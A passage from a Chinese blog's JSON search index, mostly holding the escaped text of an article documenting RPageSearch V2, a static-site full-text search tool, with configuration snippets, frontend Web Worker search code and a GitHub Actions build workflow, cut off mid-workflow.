5/icon-select.png","/articles/20230815/speedtest.png","/articles/20230815/github-fork.png"],"links":["https://github.com/RavelloH/RTheme/","https://pagespeed.web.dev/analysis/https-ravelloh-top/ojuiwt9vbw?form_factor=desktop","https://github.com/RavelloH/RPageSearch","https://ravelloh.top/articles/20230815/#%E7%AE%B1%E5%BC%8F%E4%B8%8B%E8%BD%BD%E7%9B%92","https://vscode.ravelloh.repl.co","/articles/","https://ravelloh.top/","/articles/","https://ravelloh.top/","/articles/","/works/","/about/","https://ravelloh.top/","http://music.163.com/song/media/outer/url?id=1477655546.mp3","https://drive.ravelloh.top/api/raw/?path=/video/%E9%AC%BC%E6%B3%A35.mp4","https://ravelloh.top/tools/code/","https://ravelloh.top/articles/20230815/","https://icones.js.org/collection/ri","https://twikoo.js.org/quick-start.html#%E9%80%9A%E8%BF%87-cdn-%E5%BC%95%E5%85%A5","https://analytics.ravelloh.top/","https://umami.is/docs/authentication","https://github.com/RavelloH/umami-api-route","https://github.com/RavelloH/uptime-api-route","https://sotkg.cn/","https://sotkg.cn/articles/20230904/","https://github.com/RavelloH/RPageSearch","https://github.com/RavelloH/markdown-it-api","https://github.com/RavelloH/local-sitemap-generation","https://github.com/RavelloH/local-sitemap-generation","https://github.com/Binaryify/NeteaseCloudMusicApi","https://github.com/instantpage/instant.page","https://github.com/RavelloH/umami-api-route","https://github.com/RavelloH/uptime-api-route","https://github.com/umami-software/umami","https://github.com/imaegoo/twikoo","https://drive.ravelloh.top/api/raw/?path=/share/RTheme-V3.0.0.zip","https://drive.ravelloh.top/api/raw/?path=/share/RTheme-V3.0.0.tar.gz","https://github.com/RavelloH/RTheme/releases"]},{"name":"RPageSearchV2：更快速高级的全站搜索","url":"/articles/20230812/","time":"2023-08-12","class":["技术","设计","重构"],"tag":["javascript","nodejs","json"],"title":["前言","更新内容","效果","原理","使用","初始化配置","持续构建","进阶","依赖"],"context":"&amp;nbsp;前言&amp;nbsp;2022年8月25日，我做了个新项目RPageSearch来实现静态站的全站搜索功能，并且也发了篇新博客《静态站实现全站搜索》。当时在文章的结尾我是这么说的：&amp;nbsp;“说回主角，我把它在Github立了个项，放在Github@RavelloH/RPageSearch中，现在没有时间不会再去更新它，但是以后(也可能是很久以后)会陆续升级一下，加入模糊搜索等功能。”&amp;nbsp;正好最近重制主题，为了契合新主题的风格以及性能优化正好也把RPageSearch升级了一下。现在它具有比以前丰富得多的功能，性能方面也极大的提升了。遂做篇新文章来作为新的使用文档。&amp;nbsp;项目v2版本现已发布，Releases见下：&amp;nbsp;Releases&amp;nbsp;·&amp;nbsp;RavelloH/RPageSearch&amp;nbsp;更新内容&amp;nbsp;性能优化，MB级数据索引速度小于100ms&amp;nbsp;可搜索内容扩大，从之前的标题+内容升级为标题+内容+章节+标签+分类+外链等等&amp;nbsp;更快的即时搜索&amp;nbsp;搜索语法拓展，可使用正则表达式实现模糊搜索&amp;nbsp;使用Web&amp;nbsp;Worker异步运算，不会堵塞主进程&amp;nbsp;自动持续构建升级，转入NodeJs框架&amp;nbsp;可拓展的标准数据格式，索引文件及结果均使用Object格式存储&amp;nbsp;可自定义的前端模板样式&amp;nbsp;效果&amp;nbsp;在我的博客中可直接试用此搜索功能，感受它的高性能。&amp;nbsp;原理&amp;nbsp;构建时运行search.js，这会对站点所有文章进行索引并生成一个索引文件search.json。&amp;nbsp;在客户端使用时，浏览器会请求生成的search.json，并与Web&amp;nbsp;Workersearch.worker.js建立连接。&amp;nbsp;在搜索时，搜索词及索引数据将会被发送至Worker并处理，Worker返回一个JSON格式的搜索结果。&amp;nbsp;之后，前端处理返回的结果并展示。&amp;nbsp;使用&amp;nbsp;此项目及下方所用到的所有文件/代码片段均位于RPageSearch仓库内。&amp;nbsp;Github:RavelloH/RPageSearch&amp;nbsp;初始化配置&amp;nbsp;注意：你需要先根据自己的页面结构调整脚本&amp;nbsp;配置目录结构&amp;nbsp;例子：&amp;nbsp;如果你的文章目录结构如下：&amp;nbsp;......&amp;nbsp;├──&amp;nbsp;articles&amp;nbsp;│&amp;nbsp;├──&amp;nbsp;20200816&amp;nbsp;│&amp;nbsp;│&amp;nbsp;├──&amp;nbsp;index.html&amp;nbsp;│&amp;nbsp;├──&amp;nbsp;20210701&amp;nbsp;│&amp;nbsp;│&amp;nbsp;└──&amp;nbsp;index.html&amp;nbsp;│&amp;nbsp;├──&amp;nbsp;20210705&amp;nbsp;│&amp;nbsp;│&amp;nbsp;└──&amp;nbsp;index.html&amp;nbsp;│&amp;nbsp;├──&amp;nbsp;20210719&amp;nbsp;│&amp;nbsp;│&amp;nbsp;└──&amp;nbsp;index.html&amp;nbsp;│&amp;nbsp;├──&amp;nbsp;20220206&amp;nbsp;│&amp;nbsp;│&amp;nbsp;└──&amp;nbsp;index.html&amp;nbsp;......&amp;nbsp;需要在search.js中这样配置：&amp;nbsp;//&amp;nbsp;配置区&amp;nbsp;const&amp;nbsp;articlesFolder&amp;nbsp;=&amp;nbsp;&quot;../articles/&quot;;&amp;nbsp;//&amp;nbsp;文章根目录&amp;nbsp;const&amp;nbsp;articlesFileName&amp;nbsp;=&amp;nbsp;&quot;index.html&quot;;&amp;nbsp;//&amp;nbsp;文档文件名&amp;nbsp;const&amp;nbsp;savePath&amp;nbsp;=&amp;nbsp;&quot;../assets/data/search.json&quot;;&amp;nbsp;这将会匹配这样的内容：../articles/*/index.html&amp;nbsp;RPageSearch默认会在articlesFolder中列出所有目录，并检测其中是否含有articlesFileName，如果有则进行解析。&amp;nbsp;其中，savePath定义了生成数据的保存路径，后期会用到。&amp;nbsp;配置页面结构&amp;nbsp;例子：&amp;nbsp;如果你的文章文档结构如下：&amp;nbsp;&lt;article&gt;&amp;nbsp;&lt;div&amp;nbsp;id=&quot;articles-header&quot;&gt;&amp;nbsp;&lt;h2&gt;&lt;a&amp;nbsp;href=&quot;/articles/20221224/&quot;&gt;HikvisionIP摄像头后台绕过&lt;/a&gt;&lt;/h2&gt;&lt;p&amp;nbsp;class=&quot;articles-info&quot;&gt;&amp;nbsp;&lt;time&gt;2022-12-24&lt;/time&gt;&amp;nbsp;•&lt;span&amp;nbsp;class=&quot;i_small&amp;nbsp;ri:archive-line&quot;&gt;&lt;/span&gt;&lt;span&amp;nbsp;class=&quot;class&quot;&gt;&lt;a&gt;网络安全&lt;/a&gt;/&lt;a&gt;技术&lt;/a&gt;&lt;/span&gt;&amp;nbsp;•&lt;span&amp;nbsp;class=&quot;i_small&amp;nbsp;ri:t-box-line&quot;&gt;&lt;/span&gt;&amp;nbsp;&lt;span&amp;nbsp;id=&quot;textLength&quot;&gt;----字&lt;/span&gt;&amp;nbsp;•&lt;span&amp;nbsp;class=&quot;i_small&amp;nbsp;ri:search-eye-line&quot;&gt;&lt;/span&gt;&amp;nbsp;&lt;span&amp;nbsp;id=&quot;pageVisitors&quot;&gt;---&lt;/span&gt;&amp;nbsp;&lt;/p&gt;&amp;nbsp;&lt;p&amp;nbsp;class=&quot;articles-tags&quot;&gt;&amp;nbsp;&lt;span&amp;nbsp;class=&quot;i_small&amp;nbsp;ri:price-tag-3-line&quot;&gt;&lt;/span&gt;&lt;a&gt;ATTACK&lt;/a&gt;&lt;a&gt;JSON&lt;/a&gt;&lt;a&gt;MONITOR&lt;/a&gt;&amp;nbsp;&lt;/p&gt;&amp;nbsp;&lt;hr&gt;&amp;nbsp;&lt;/div&gt;&amp;nbsp;&lt;div&amp;nbsp;id=&quot;articles-body&quot;&gt;&amp;nbsp;&lt;h3&gt;标题&lt;/h3&gt;&lt;p&gt;&amp;nbsp;正文内容&amp;nbsp;&lt;/p&gt;&amp;nbsp;&lt;br&gt;&lt;br&gt;&lt;h3&gt;标题&lt;/h3&gt;&lt;p&gt;&amp;nbsp;正文&amp;nbsp;&lt;/p&gt;&amp;nbsp;&lt;h3&gt;标题&lt;/h3&gt;&lt;p&gt;&amp;nbsp;正文&amp;nbsp;&lt;/p&gt;&amp;nbsp;&lt;/div&gt;&amp;nbsp;&lt;div&amp;nbsp;id=&quot;articles-footer&quot;&gt;&amp;nbsp;略&amp;nbsp;&lt;/div&gt;&amp;nbsp;&lt;/article&gt;&amp;nbsp;可以在search.js中这样配置：&amp;nbsp;//&amp;nbsp;选择器&amp;nbsp;const&amp;nbsp;articlesName&amp;nbsp;=&amp;nbsp;&quot;#articles-header&amp;nbsp;h2&amp;nbsp;a&quot;;&amp;nbsp;//&amp;nbsp;文章标题元素&amp;nbsp;const&amp;nbsp;articlesUrl&amp;nbsp;=&amp;nbsp;&quot;#articles-header&amp;nbsp;h2&amp;nbsp;a&quot;;&amp;nbsp;//&amp;nbsp;文章链接元素&amp;nbsp;const&amp;nbsp;articlesTime&amp;nbsp;=&amp;nbsp;&quot;#articles-header&amp;nbsp;.articles-info&amp;nbsp;time&quot;;&amp;nbsp;//&amp;nbsp;文章时间元素&amp;nbsp;const&amp;nbsp;articlesClass&amp;nbsp;=&amp;nbsp;&quot;#articles-header&amp;nbsp;.articles-info&amp;nbsp;.class&amp;nbsp;a&quot;;&amp;nbsp;//&amp;nbsp;文章分类元素&amp;nbsp;const&amp;nbsp;articlesTag&amp;nbsp;=&amp;nbsp;&quot;#articles-header&amp;nbsp;.articles-tags&amp;nbsp;a&quot;;&amp;nbsp;//&amp;nbsp;文章标签元素&amp;nbsp;const&amp;nbsp;articlesBody&amp;nbsp;=&amp;nbsp;&quot;#articles-body&quot;;&amp;nbsp;//&amp;nbsp;文章正文元素&amp;nbsp;const&amp;nbsp;articlesImages&amp;nbsp;=&amp;nbsp;&quot;#articles-body&amp;nbsp;img&quot;;&amp;nbsp;//&amp;nbsp;文章图片元素&amp;nbsp;const&amp;nbsp;articlesLinks&amp;nbsp;=&amp;nbsp;&quot;#articles-body&amp;nbsp;a&quot;;&amp;nbsp;//&amp;nbsp;文章外链元素&amp;nbsp;const&amp;nbsp;articlesTitle&amp;nbsp;=&amp;nbsp;&quot;#articles-body&amp;nbsp;h2&amp;nbsp;,&amp;nbsp;#articles-body&amp;nbsp;h3&amp;nbsp;,&amp;nbsp;articles-body&amp;nbsp;h4&amp;nbsp;,&amp;nbsp;articles-body&amp;nbsp;h5&amp;nbsp;,&amp;nbsp;articles-body&amp;nbsp;h6&quot;;&amp;nbsp;//&amp;nbsp;文章小标题元素&amp;nbsp;这里可以任意使用CSS选择器，参考如上。&amp;nbsp;生成索引数据&amp;nbsp;安装依赖并执行search.js&amp;nbsp;npm&amp;nbsp;install&amp;nbsp;node&amp;nbsp;search.js&amp;nbsp;不出意外，用于保存结果的search.json会正常生成在之前定义的路径savePath中。&amp;nbsp;此文件用于与search.worker.js通信，其格式一般不需要调整，为所有索引的对象，其中的一项格式如下：&amp;nbsp;{&amp;nbsp;&quot;name&quot;:&amp;nbsp;&quot;Minecraft反转药水效果&quot;,&amp;nbsp;&quot;url&quot;:&amp;nbsp;&quot;/articles/20200816/&quot;,&amp;nbsp;&quot;time&quot;:&amp;nbsp;&quot;2020-08-16&quot;,&amp;nbsp;&quot;class&quot;:&amp;nbsp;[&amp;nbsp;&quot;游戏&quot;&amp;nbsp;],&amp;nbsp;&quot;tag&quot;:&amp;nbsp;[&amp;nbsp;&quot;minecraft&quot;,&amp;nbsp;&quot;json&quot;&amp;nbsp;],&amp;nbsp;&quot;title&quot;:&amp;nbsp;[&amp;nbsp;&quot;原理&quot;,&amp;nbsp;&quot;效果&quot;,&amp;nbsp;&quot;命令&quot;&amp;nbsp;],&amp;nbsp;&quot;context&quot;:&amp;nbsp;&quot;文章内容，略&quot;&amp;nbsp;&quot;img&quot;:&amp;nbsp;[&amp;nbsp;&quot;/articles/20200816/show1.gif&quot;,&amp;nbsp;&quot;/articles/20200816/show2.gif&quot;,&amp;nbsp;&quot;/articles/20200816/show3.gif&quot;&amp;nbsp;],&amp;nbsp;&quot;links&quot;:&amp;nbsp;[]&amp;nbsp;}&amp;nbsp;前端接入&amp;nbsp;你需要在frontEnd.js中自定义以适应你的样式。详细的例子，可以参照我的博客或RTheme&amp;nbsp;search.worker.js一般不需要调整。它会在搜索时返回以下结构的结果：&amp;nbsp;[{&amp;nbsp;&quot;name&quot;:&amp;nbsp;&quot;论静态页中伪动态的实现&quot;,&amp;nbsp;&quot;url&quot;:&amp;nbsp;&quot;/articles/20220708/&quot;,&amp;nbsp;&quot;time&quot;:&amp;nbsp;&quot;2022-07-08&quot;,&amp;nbsp;&quot;class&quot;:&amp;nbsp;[&amp;nbsp;&quot;技术&quot;,&amp;nbsp;&quot;设计&quot;&amp;nbsp;],&amp;nbsp;&quot;tag&quot;:&amp;nbsp;[&amp;nbsp;&quot;javascript&quot;,&amp;nbsp;&quot;html&quot;,&amp;nbsp;&quot;python&quot;&amp;nbsp;],&amp;nbsp;&quot;title&quot;:&amp;nbsp;[&amp;nbsp;&quot;前言&quot;,&amp;nbsp;&quot;效果&quot;,&amp;nbsp;&quot;实现方法&quot;,&amp;nbsp;&quot;页面自动构建&quot;&amp;nbsp;],&amp;nbsp;&quot;context&quot;:&amp;nbsp;&quot;文章内容，这里略&quot;&amp;nbsp;&quot;img&quot;:&amp;nbsp;[&amp;nbsp;&quot;/articles/20220708/show1.gif&quot;,&amp;nbsp;&quot;/articles/20220708/show2.png&quot;,&amp;nbsp;&quot;/articles/20220708/code3.png&quot;&amp;nbsp;],&amp;nbsp;&quot;links&quot;:&amp;nbsp;[&amp;nbsp;&quot;?text=123&amp;?name=aaa#锚点&quot;,&amp;nbsp;&quot;https://ravelloh.github.io/PSGameSpider/&quot;,&amp;nbsp;&quot;https://ravelloh.github.io/EverydayNews/&quot;,&amp;nbsp;&quot;https://github.com/RavelloH/PSGameSpider&quot;,&amp;nbsp;&quot;?text=123&amp;?name=aaa#实现方法&quot;,&amp;nbsp;&quot;https://docs.github.com/cn/actions&quot;,&amp;nbsp;&quot;https://github.com/RavelloH/PSGameSpider&quot;,&amp;nbsp;&quot;https://github.com/RavelloH/EverydayNews&quot;&amp;nbsp;],&amp;nbsp;&quot;match&quot;:&amp;nbsp;[&amp;nbsp;[&amp;nbsp;&quot;context&quot;,&amp;nbsp;25,&amp;nbsp;118&amp;nbsp;],&amp;nbsp;[&amp;nbsp;&quot;links&quot;,&amp;nbsp;1&amp;nbsp;]&amp;nbsp;],&amp;nbsp;&quot;matchTimes&quot;:&amp;nbsp;25&amp;nbsp;},&amp;nbsp;{&amp;nbsp;&quot;name&quot;:&amp;nbsp;&quot;静态站实现全站搜索&quot;,&amp;nbsp;&quot;url&quot;:&amp;nbsp;&quot;/articles/20220825/&quot;,&amp;nbsp;&quot;time&quot;:&amp;nbsp;&quot;2022-08-25&quot;,&amp;nbsp;&quot;class&quot;:&amp;nbsp;[&amp;nbsp;&quot;技术&quot;,&amp;nbsp;&quot;设计&quot;&amp;nbsp;],&amp;nbsp;&quot;tag&quot;:&amp;nbsp;[&amp;nbsp;&quot;javascript&quot;,&amp;nbsp;&quot;json&quot;,&amp;nbsp;&quot;python&quot;&amp;nbsp;],&amp;nbsp;&quot;title&quot;:&amp;nbsp;[&amp;nbsp;&quot;前言&quot;,&amp;nbsp;&quot;效果&quot;,&amp;nbsp;&quot;实现方式&quot;,&amp;nbsp;&quot;代码分析&quot;,&amp;nbsp;&quot;后言&quot;&amp;nbsp;],&amp;nbsp;&quot;context&quot;:&amp;nbsp;&quot;文章内容，这里略&quot;&amp;nbsp;&quot;img&quot;:&amp;nbsp;[&amp;nbsp;&quot;/articles/20220825/show1.jpg&quot;&amp;nbsp;],&amp;nbsp;&quot;links&quot;:&amp;nbsp;[&amp;nbsp;&quot;/articles/&quot;,&amp;nbsp;&quot;https://github.com/ravelloh/ravelloh.github.io&quot;,&amp;nbsp;&quot;https://github.com/ravelloh/RPageSearch&quot;&amp;nbsp;],&amp;nbsp;&quot;match&quot;:&amp;nbsp;[&amp;nbsp;[&amp;nbsp;&quot;context&quot;,&amp;nbsp;7,&amp;nbsp;103&amp;nbsp;],&amp;nbsp;[&amp;nbsp;&quot;links&quot;,&amp;nbsp;1&amp;nbsp;]&amp;nbsp;],&amp;nbsp;&quot;matchTimes&quot;:&amp;nbsp;7&amp;nbsp;}]&amp;nbsp;返回的对象包含索引的所有内容，并已经按照相关度排序，且其匹配项会被包裹在&lt;mark&gt;&lt;/mark&gt;标签内。除此以外，还会包含一个特殊值match用于表示所有匹配的结果数据。&amp;nbsp;match定义了一个结果列表，其每一项的第一项表示匹配的属性，第二项表示匹配的属性在所有属性中的排序。&amp;nbsp;其中，context属性与其他属性稍微不同，它的第二项是匹配个数，第三项是第一次匹配的字符位置。&amp;nbsp;match的最后一项是matchTimes，表示匹配次数。如果含有标题匹配，这个值会是999999以确保其在结果中置顶。&amp;nbsp;因为是使用worker通讯，你可以参照frontEnd.js中的search函数配置你的结果展示。&amp;nbsp;在示例中，搜索的核心实现如下：&amp;nbsp;function&amp;nbsp;getSearchData()&amp;nbsp;{&amp;nbsp;if&amp;nbsp;(typeof&amp;nbsp;searchData&amp;nbsp;==&amp;nbsp;&quot;undefined&quot;)&amp;nbsp;{&amp;nbsp;return&amp;nbsp;new&amp;nbsp;Promise((resolve,&amp;nbsp;reject)&amp;nbsp;=&gt;&amp;nbsp;{&amp;nbsp;fetch(dataFilePath,&amp;nbsp;{})&amp;nbsp;.then((response)&amp;nbsp;=&gt;&amp;nbsp;response.json())&amp;nbsp;.then((data)&amp;nbsp;=&gt;&amp;nbsp;{&amp;nbsp;searchData&amp;nbsp;=&amp;nbsp;data;&amp;nbsp;resolve(data);&amp;nbsp;});&amp;nbsp;}).catch((err)&amp;nbsp;=&gt;&amp;nbsp;{&amp;nbsp;throw&amp;nbsp;err;&amp;nbsp;});&amp;nbsp;}&amp;nbsp;else&amp;nbsp;{&amp;nbsp;return&amp;nbsp;Promise.resolve(searchData);&amp;nbsp;}&amp;nbsp;}&amp;nbsp;function&amp;nbsp;search(keyword)&amp;nbsp;{&amp;nbsp;let&amp;nbsp;start&amp;nbsp;=&amp;nbsp;new&amp;nbsp;Date().getTime();&amp;nbsp;if&amp;nbsp;(keyword&amp;nbsp;==&amp;nbsp;&quot;&quot;&amp;nbsp;||&amp;nbsp;keyword&amp;nbsp;==&amp;nbsp;&quot;.&quot;)&amp;nbsp;{&amp;nbsp;return&amp;nbsp;false;&amp;nbsp;}&amp;nbsp;searchWord&amp;nbsp;=&amp;nbsp;HTMLDecode(keyword);&amp;nbsp;getSearchData().then((data)&amp;nbsp;=&gt;&amp;nbsp;{&amp;nbsp;if&amp;nbsp;(typeof&amp;nbsp;searchWorker&amp;nbsp;==&amp;nbsp;&quot;undefined&quot;)&amp;nbsp;{&amp;nbsp;searchWorker&amp;nbsp;=&amp;nbsp;new&amp;nbsp;Worker(workerPath);&amp;nbsp;}&amp;nbsp;searchWorker.onmessage&amp;nbsp;=&amp;nbsp;(result)&amp;nbsp;=&gt;&amp;nbsp;{&amp;nbsp;let&amp;nbsp;end&amp;nbsp;=&amp;nbsp;new&amp;nbsp;Date().getTime();&amp;nbsp;let&amp;nbsp;data&amp;nbsp;=&amp;nbsp;result.data;&amp;nbsp;console.log(`查询操作用时${end&amp;nbsp;-&amp;nbsp;start}MS`);&amp;nbsp;if&amp;nbsp;(data.length&amp;nbsp;==&amp;nbsp;0)&amp;nbsp;{&amp;nbsp;console.log(&quot;未找到有关选项&quot;);&amp;nbsp;return&amp;nbsp;false;&amp;nbsp;}&amp;nbsp;let&amp;nbsp;resultHTML&amp;nbsp;=&amp;nbsp;&quot;&quot;;&amp;nbsp;data.forEach((e,&amp;nbsp;index)&amp;nbsp;=&gt;&amp;nbsp;{&amp;nbsp;resultHTML&amp;nbsp;+=&amp;nbsp;structureSearchResult(e);&amp;nbsp;});&amp;nbsp;console.log(resultHTML);&amp;nbsp;//&amp;nbsp;结果输出&amp;nbsp;};&amp;nbsp;searchWorker.postMessage([data,&amp;nbsp;searchWord]);&amp;nbsp;});&amp;nbsp;}&amp;nbsp;这实际上是RTheme中相关组件的精简版，它使用getSearchData()方式返回一个Promise，并在存在本地缓存是直接返回或在本地无缓存时请求数据并异步返回。&amp;nbsp;最主要的功能实现在函数search()的定义内，它会转义搜索词并与Worker通信，将返回结果的每一项传递给新函数structureSearchResult()以构建标准HTML输出。示例中的输出格式如下:&amp;nbsp;function&amp;nbsp;structureSearchResult(result)&amp;nbsp;{&amp;nbsp;let&amp;nbsp;cla&amp;nbsp;=&amp;nbsp;&quot;&quot;;&amp;nbsp;let&amp;nbsp;tag&amp;nbsp;=&amp;nbsp;&quot;&quot;;&amp;nbsp;let&amp;nbsp;match&amp;nbsp;=&amp;nbsp;&quot;&quot;;&amp;nbsp;let&amp;nbsp;matchItem,&amp;nbsp;matchNum,&amp;nbsp;matchContext,&amp;nbsp;matchTag,&amp;nbsp;matchClass,&amp;nbsp;matchTitle,&amp;nbsp;matchLinks;&amp;nbsp;let&amp;nbsp;strLinks&amp;nbsp;=&amp;nbsp;&quot;&quot;;&amp;nbsp;result.match.forEach((e)&amp;nbsp;=&gt;&amp;nbsp;{&amp;nbsp;if&amp;nbsp;(typeof&amp;nbsp;e&amp;nbsp;==&amp;nbsp;&quot;object&quot;)&amp;nbsp;{&amp;nbsp;matchItem&amp;nbsp;=&amp;nbsp;e[0];&amp;nbsp;}&amp;nbsp;else&amp;nbsp;{&amp;nbsp;matchItem&amp;nbsp;=&amp;nbsp;e;&amp;nbsp;}&amp;nbsp;switch&amp;nbsp;(matchItem)&amp;nbsp;{&amp;nbsp;case&amp;nbsp;&quot;name&quot;:&amp;nbsp;match&amp;nbsp;+=&amp;nbsp;&quot;标题&amp;nbsp;/&amp;nbsp;&quot;;&amp;nbsp;break;&amp;nbsp;case&amp;nbsp;&quot;context&quot;:&amp;nbsp;matchNum&amp;nbsp;=&amp;nbsp;e;&amp;nbsp;match&amp;nbsp;+=&amp;nbsp;`内容(${e[1]}次)&amp;nbsp;/&amp;nbsp;`;&amp;nbsp;break;&amp;nbsp;case&amp;nbsp;&quot;title&quot;:&amp;nbsp;match&amp;nbsp;+=&amp;nbsp;&quot;章节&amp;nbsp;/&amp;nbsp;&quot;;&amp;nbsp;matchTitle&amp;nbsp;=&amp;nbsp;e;&amp;nbsp;break;&amp;nbsp;case&amp;nbsp;&quot;tag&quot;:&amp;nbsp;match&amp;nbsp;+=&amp;nbsp;&quot;标签&amp;nbsp;/&amp;nbsp;&quot;;&amp;nbsp;matchTag&amp;nbsp;=&amp;nbsp;e;&amp;nbsp;break;&amp;nbsp;case&amp;nbsp;&quot;class&quot;:&amp;nbsp;match&amp;nbsp;+=&amp;nbsp;&quot;分类&amp;nbsp;/&amp;nbsp;&quot;;&amp;nbsp;matchClass&amp;nbsp;=&amp;nbsp;e;&amp;nbsp;break;&amp;nbsp;case&amp;nbsp;&quot;links&quot;:&amp;nbsp;match&amp;nbsp;+=&amp;nbsp;&quot;外链&amp;nbsp;/&amp;nbsp;&quot;;&amp;nbsp;matchLinks&amp;nbsp;=&amp;nbsp;e;&amp;nbsp;break;&amp;nbsp;}&amp;nbsp;});&amp;nbsp;result.class.forEach((e,&amp;nbsp;index)&amp;nbsp;=&gt;&amp;nbsp;{&amp;nbsp;if&amp;nbsp;(typeof&amp;nbsp;matchClass&amp;nbsp;!==&amp;nbsp;&quot;undefined&quot;&amp;nbsp;&amp;&amp;nbsp;&amp;&amp;nbsp;matchClass[1]&amp;nbsp;==&amp;nbsp;index)&amp;nbsp;{&amp;nbsp;cla&amp;nbsp;+=&amp;nbsp;`&lt;a&amp;nbsp;href=&quot;#/classification/${e}&quot;&amp;nbsp;class=&#39;active&#39;&gt;${e}&lt;/a&gt;/`;&amp;nbsp;}&amp;nbsp;else&amp;nbsp;{&amp;nbsp;cla&amp;nbsp;+=&amp;nbsp;`&lt;a&amp;nbsp;href=&quot;#/classification/${e}&quot;&gt;${e}&lt;/a&gt;/`;&amp;nbsp;}&amp;nbsp;});&amp;nbsp;cla&amp;nbsp;=&amp;nbsp;cla.substring(0,&amp;nbsp;cla.length&amp;nbsp;-&amp;nbsp;1);&amp;nbsp;result.tag.forEach((e,&amp;nbsp;index)&amp;nbsp;=&gt;&amp;nbsp;{&amp;nbsp;if&amp;nbsp;(typeof&amp;nbsp;matchTag&amp;nbsp;!==&amp;nbsp;&quot;undefined&quot;&amp;nbsp;&amp;&amp;nbsp;&amp;&amp;nbsp;matchTag[1]&amp;nbsp;==&amp;nbsp;index)&amp;nbsp;{&amp;nbsp;tag&amp;nbsp;+=&amp;nbsp;`&lt;a&amp;nbsp;href=&quot;#/tag/${e}&quot;&amp;nbsp;class=&#39;active&#39;&gt;${e}&lt;/a&gt;`;&amp;nbsp;}&amp;nbsp;else&amp;nbsp;{&amp;nbsp;tag&amp;nbsp;+=&amp;nbsp;`&lt;a&amp;nbsp;href=&quot;#/tag/${e}&quot;&gt;${e}&lt;/a&gt;`;&amp;nbsp;}&amp;nbsp;});&amp;nbsp;match&amp;nbsp;=&amp;nbsp;match.substring(0,&amp;nbsp;match.length&amp;nbsp;-&amp;nbsp;3);&amp;nbsp;if&amp;nbsp;(typeof&amp;nbsp;matchNum&amp;nbsp;==&amp;nbsp;&quot;undefined&quot;&amp;nbsp;||&amp;nbsp;matchNum[2]&amp;nbsp;&lt;&amp;nbsp;10)&amp;nbsp;{&amp;nbsp;matchContext&amp;nbsp;=&amp;nbsp;result.context.substring(0,&amp;nbsp;150);&amp;nbsp;}&amp;nbsp;else&amp;nbsp;{&amp;nbsp;matchContext&amp;nbsp;=&amp;nbsp;result.context.substring(&amp;nbsp;matchNum[2]&amp;nbsp;-&amp;nbsp;10,&amp;nbsp;matchNum[2]&amp;nbsp;+&amp;nbsp;140,&amp;nbsp;);&amp;nbsp;}&amp;nbsp;result.links.forEach((e,&amp;nbsp;index)&amp;nbsp;=&gt;&amp;nbsp;{&amp;nbsp;if&amp;nbsp;(typeof&amp;nbsp;matchLinks&amp;nbsp;!==&amp;nbsp;&quot;undefined&quot;&amp;nbsp;&amp;&amp;nbsp;&amp;&amp;nbsp;matchLinks[1]&amp;nbsp;==&amp;nbsp;index)&amp;nbsp;{&amp;nbsp;strLinks&amp;nbsp;=&amp;nbsp;`&lt;a&amp;nbsp;class=&#39;search-result-links&amp;nbsp;one-line&#39;&amp;nbsp;href=&#39;${e}&#39;&gt;&lt;span&amp;nbsp;class=&#39;i_small&amp;nbsp;ri:link&#39;&gt;&lt;/span&gt;&amp;nbsp;${e}&lt;/a&gt;`;&amp;nbsp;}&amp;nbsp;});&amp;nbsp;return&amp;nbsp;`&lt;div&amp;nbsp;class=&quot;loaded&amp;nbsp;listprogram&quot;&gt;&lt;article&gt;&lt;span&amp;nbsp;class=&quot;article-name&quot;&gt;&lt;h4&gt;&lt;a&amp;nbsp;href=&quot;${result.url}&quot;&gt;${result.name}&lt;/a&gt;&lt;/h4&gt;&lt;/span&gt;&lt;p&amp;nbsp;class=&quot;articles-info&quot;&gt;&lt;span&amp;nbsp;class=&#39;search-result-tags&#39;&gt;${match}&lt;/span&gt;&lt;time&gt;${result.time}&lt;/time&gt;&amp;nbsp;•&amp;nbsp;&lt;span&amp;nbsp;class=&quot;i_small&amp;nbsp;ri:archive-line&quot;&gt;&lt;/span&gt;&lt;span&amp;nbsp;class=&quot;class&quot;&gt;${cla}&lt;/span&gt;&lt;div&amp;nbsp;class=&#39;search-result-context&#39;&gt;&lt;span&amp;nbsp;class=&#39;i_small&amp;nbsp;ri:file-list-2-line&#39;&gt;&lt;/span&gt;&amp;nbsp;...${matchContext}&lt;/div&gt;${strLinks}&lt;/p&gt;&lt;p&amp;nbsp;class=&quot;articles-tags&quot;&gt;${tag}&lt;/p&gt;&lt;/article&gt;&lt;hr&gt;&lt;/div&gt;`&amp;nbsp;}&amp;nbsp;你可以据此使用result.url&amp;nbsp;result.name&amp;nbsp;match&amp;nbsp;result.time&amp;nbsp;cla&amp;nbsp;matchContext&amp;nbsp;strLinks&amp;nbsp;tag等结果字符串自定义你的输出模板。其中，matchContext会返回结果前后共150字符的内容，你可以通过修改CSS实现其样式的优化，或直接参考RTheme&amp;nbsp;持续构建&amp;nbsp;在初始化成功后，你可以使用github&amp;nbsp;Workflow在有更改时自动构建。&amp;nbsp;添加一个.github/workflow/search.xml，示例如下：&amp;nbsp;name:&amp;nbsp;RPageSearch&amp;nbsp;on:&amp;nbsp;push:&amp;nbsp;paths:&amp;nbsp;-&amp;nbsp;&#39;articles/**&#39;&amp;nbsp;workflow_dispatch:&amp;nbsp;permissions:&amp;nbsp;contents:&amp;nbsp;write&amp;nbsp;pages:&amp;nbsp;write&amp;nbsp;id-token:&amp;nbsp;write&amp;nbsp;jobs:&amp;nbsp;build:&amp;nbsp;runs-on:&amp;nbsp;ubuntu-latest&amp;nbsp;#运行环境&amp;nbsp;steps:&amp;nbsp;-&amp;nbsp;name:&amp;nbsp;Checkout&amp;nbsp;uses:&amp;nbsp;actions/checkout@v2&amp;nbsp;-&amp;nbsp;name:&amp;nbsp;&#39;Git&amp;nbsp;set&#39;&amp;nbsp;run:&amp;nbsp;|&amp;nbsp;git&amp;nbsp;init&amp;nbsp;git&amp;nbsp;pull&amp;nbsp;-&amp;nbsp;name:&amp;nbsp;&#39;Set&amp;nbsp;up&amp;nbsp;nodejs&#39;&amp;nbsp;uses:&amp;nbsp;actions/setup-node@v3&amp;nbsp;with:&amp;nbsp;node-version:&amp;nbsp;&#39;latest&#39;&amp;nbsp;-&amp;nbsp;name:&amp;nbsp;&#39;Install&amp;nbsp;requirements&#39;&amp;nbsp;run:&amp;nbsp;|&amp;nbsp;npm&amp;nbsp;install&amp;nbsp;-&amp;nbsp;name:&amp;nbsp;&#39;Working&#39;&amp;nbsp;run:&amp;nbsp;|&amp;nbsp;node&amp;nbsp;search.js&amp;nbsp;-&amp;nbs